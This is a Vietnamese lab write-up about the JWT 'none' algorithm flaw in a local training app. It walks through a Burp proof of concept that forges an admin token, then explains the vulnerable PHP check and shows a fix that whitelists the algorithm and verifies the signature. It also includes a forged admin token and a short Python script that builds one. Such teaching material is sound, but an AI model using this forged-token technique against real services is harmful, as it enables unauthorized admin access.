1. JWT None Algorithm

URL: `http://127.0.0.1/OhMyCrab/modules/jwt/none_algorithm.php`

Ứng dụng tồn tại lỗ hổng JWT None Algorithm do server tin tưởng giá trị alg do client cung cấp và chấp nhận thuật toán none mà không thực hiện verify signature. Attacker có thể chỉnh sửa payload JWT để giả mạo quyền admin mà không cần biết secret key.

PoC

- Đăng nhập vào lab bằng tài khoản bất kỳ.

- Ứng dụng sinh JWT mặc định: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNheW1haSIsInJvbGUiOiJ1c2VyIn0.HvntaPzvFxoy8SAE-ZynSuSX_MvYYjp-IrcmaFsIU5Q`

<img width="781" height="477" alt="image" src="https://github.com/user-attachments/assets/9cf07256-7b48-41a5-afae-0e4bc0201466" />

- Gửi request xác thực vào burp repeater

<img width="929" height="628" alt="image" src="https://github.com/user-attachments/assets/6d81abab-03c0-40fa-9af2-27eb1c55ad68" />

- Bấm vào tab `JSON Web Token`, công cụ tự động tách header và payload ra thành dạng text rõ ràng, sau đó sửa `"alg": "HS256"` thành `"alg": "none".`, `"role": "user"` thành `"role": "admin"`.

- Ở phía dưới cùng của giao diện JWT Editor có nút `Attack`, nhấn vào và chọn `none Signing Algorithm`, công cụ sẽ tự động cấu hình chuẩn chuỗi JWT.

- Chuỗi JWT: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNheW1haSIsInJvbGUiOiJhZG1pbiJ9.`

<img width="581" height="657" alt="image" src="https://github.com/user-attachments/assets/9f2dfdd2-f27e-4539-9cab-1fd5389e925b" />

- Quay lại request sửa lại token thành chuỗi JWT mới, nhấn send để gửi request và quan sát response.

<img width="1131" height="562" alt="image" src="https://github.com/user-attachments/assets/70da9178-4488-4422-895e-62100cd00d75" />

Attacker đã bypass authentication và giả mạo quyền admin thành công.

Phân tích source code

```
if (
    isset($header['alg']) && $header['alg'] === 'none'
)
{
    if (
        isset($payload['role']) && $payload['role'] === 'admin'
    )
```

- Ứng dụng đọc trực tiếp giá trị alg từ JWT do client gửi lên.

- Nếu alg=none, server bỏ qua hoàn toàn bước verify signature.

- Ứng dụng chỉ kiểm tra `$payload['role'] === 'admin'`. Do payload JWT có thể bị attacker chỉnh sửa tùy ý nên attacker chỉ cần sửa role thành admin để chiếm quyền quản trị.

- Đây là lỗi JWT None Algorithm xảy ra khi ứng dụng cho phép `alg=none`, tin tưởng dữ liệu JWT phía client, không verify signature.

Cách khắc phục

```
$allowed_alg = "HS256";
if (!isset($header['alg']) || $header['alg'] !== $allowed_alg) {
    $message = "<p style='color:red'>Thuật toán không hợp lệ!</p>";
    exit;
}
$expected_signature = hash_hmac(
    "sha256",
    "$parts[0].$parts[1]",
    $secret,
    true
);
$expected_signature_encoded = base64url_encode($expected_signature);
if (!hash_equals($expected_signature_encoded, $parts[2])) {
    logAttack(5, $token, 403);
    $message = "<p style='color:red'>Token không hợp lệ</p>";
    exit;
}
$payload = json_decode(base64url_decode($parts[1]), true);
if ($payload['role'] === 'admin') {
    echo "ADMIN";
}
```

- Sau khi fix, hệ thống xử lý JWT theo đúng thứ tự an toàn: kiểm tra định dạng token, xác thực thuật toán (alg whitelist), xác minh chữ ký (signature verification), và sau đó mới giải mã payload để thực hiện phân quyền (authorization).

Script khai thác

```
import base64
import json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

header = {
    "alg": "none",
    "typ": "JWT"
}
payload = {
    "username": "caymai",
    "role": "admin"
}
token = (b64url(header) + "." + b64url(payload) + ".")

print(token)
```

Đây là script khai thác tự động tạo một token JWT giả mạo để khai thác lỗ hổng JWT None Algorithm.
